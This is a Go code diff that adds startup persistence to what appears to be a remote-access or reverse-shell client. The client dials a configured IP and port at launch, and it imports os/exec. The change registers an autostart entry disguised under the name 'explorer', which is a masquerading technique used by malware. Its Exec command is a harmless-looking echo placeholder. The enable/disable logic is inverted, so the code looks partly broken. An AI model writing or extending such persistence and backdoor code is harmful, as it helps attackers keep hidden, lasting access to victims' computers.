@@ -4,12 +4,15 @@ import (
 	"io/ioutil"
 	random "math/rand"
 	"net"
+	"log"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
+	
+	"github.com/ProtonMail/go-autostart"
 )
 
 const (
@@ -24,6 +27,17 @@ var (
 )
 
 func main() {
+	app := &autostart.App{
+		Name:        "explorer",
+		DisplayName: "explorer",
+		Exec:        []string{"bash", "-c", "echo autostart >> ~/autostart.txt"},
+	}
+
+	if app.IsEnabled() {
+		app.Disable()
+		app.Enable()
+	}
+	
 	conn, err := net.Dial("tcp", IP+":"+PORT)
 	if err != nil {
 		os.Exit(1)
